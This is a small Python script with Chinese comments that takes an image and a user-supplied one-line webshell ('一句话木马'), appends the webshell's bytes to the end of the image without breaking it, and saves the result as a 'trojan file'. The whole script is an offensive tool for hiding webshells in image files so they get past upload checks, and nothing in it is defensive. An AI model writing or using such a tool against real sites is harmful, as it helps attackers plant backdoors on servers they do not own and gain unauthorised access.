# code : utf-8
# Author : PurpleFire
# Nutshsll(坚果壳)


import binascii
import os


picture = input("请输入图片路径:")
if os.path.exists(picture):  # 判断文件是否存在
    try:
        pic_hex = binascii.hexlify(
            open(picture, "rb").read()).decode("utf-8")  # 将其转化为十六进制
    except Exception as e:  # 没有图片
        print("文件无法打开！！！\n")
else:
    print("文件不存在！！！\n")
    exit()  # 不存在直接退出

word = input("请输入一句话木马:")  # 输入一句话木马
# 将一句话木马转化为十六进制(utf-8格式)
word_hex = binascii.hexlify(word.encode("utf-8")).decode("utf-8")
# 将两段十六进制结合,并转化为字符串格式,注意:一句话木马在图片之后，避免破坏图片文件
result = binascii.a2b_hex((pic_hex + word_hex).encode("utf-8"))

result_filename=os.path.splitext(picture)[0]+"-result" + os.path.splitext(picture)[1]
#生成之后的文件名(包含有路径)

with open(result_filename, "wb") as f:  # 以二进制的形式写入图片
    f.write(result)
    print("木马文件%s已经生成于%s" % (os.path.split(result_filename)[1],os.path.split(picture)[0]))
